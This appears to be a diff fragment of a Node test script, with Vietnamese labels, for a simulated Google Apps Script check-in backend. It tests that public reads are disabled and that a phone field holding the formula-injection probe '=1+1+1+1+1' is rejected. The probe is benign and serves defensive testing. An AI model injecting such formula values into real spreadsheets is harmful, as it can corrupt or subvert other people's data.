+T('Nguồn: giữ safeText_, setNumberFormat(\'@\'), LockService', /function safeText_/.test(SRC) && /setNumberFormat\('@'\)/.test(SRC) && /LockService\.getScriptLock/.test(SRC));
+
+/* ===== Bản cho dự án CŨ (google_apps_script-du-an-cu.js): vẫn tắt doGet và nhận app cũ ===== */
+{
+  const env = load({ src: SRC_OLD });
+  T('Dự án cũ: file có ghi chú "CHỈ DÀNH CHO DỰ ÁN APPS SCRIPT CŨ", không làm BƯỚC 5', /CHỈ DÀNH CHO DỰ ÁN APPS SCRIPT CŨ/.test(SRC_OLD) && /KHÔNG làm BƯỚC 5/.test(SRC_OLD));
+  T('Dự án cũ: doGet trả public_read_disabled', env.G({}).getContent() === '{"result":"error","error":"public_read_disabled"}');
+  const r = env.P(LEGACY);
+  T('Dự án cũ: payload app cũ f76adc9 vẫn ghi được, chặn công thức', r.result === 'success' && env.P(Object.assign({}, LEGACY, { phone: '=1+1+1+1+1' })).error === 'phone_invalid' && noFormula(env.sheets.CheckIn), JSON.stringify(r));
+}
 
 console.log('\n' + passes + ' PASS, ' + fails + ' FAIL (Apps Script giả lập)');
 process.exit(fails ? 1 : 0);
